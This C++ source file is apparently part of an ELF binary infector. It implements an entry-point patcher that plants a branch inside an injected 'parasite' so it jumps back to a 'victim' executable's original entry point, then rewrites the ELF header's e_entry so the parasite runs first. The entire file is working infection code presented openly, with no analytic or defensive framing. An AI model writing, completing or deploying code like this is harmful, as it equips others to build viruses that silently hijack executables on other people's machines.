#include "redirection/entry_point.hh"
#include "redirection/patching.hh"

namespace vf::redirection {

bool EntryPointPatcher::operator()(Elf64_Addr parasite_entry_address,
                                   Elf64_Off parasite_file_offset,
                                   Elf64_Off patch_offset_from_parasite_start,
                                   std::span<std::byte> victim) {
  auto& ehdr = reinterpret_cast<Elf64_Ehdr&>(*victim.data());

  patch_branch(&victim[parasite_file_offset + patch_offset_from_parasite_start],
               parasite_entry_address + patch_offset_from_parasite_start,
               ehdr.e_entry);

  ehdr.e_entry = parasite_entry_address;
  return true;
}

}  // namespace vf::redirection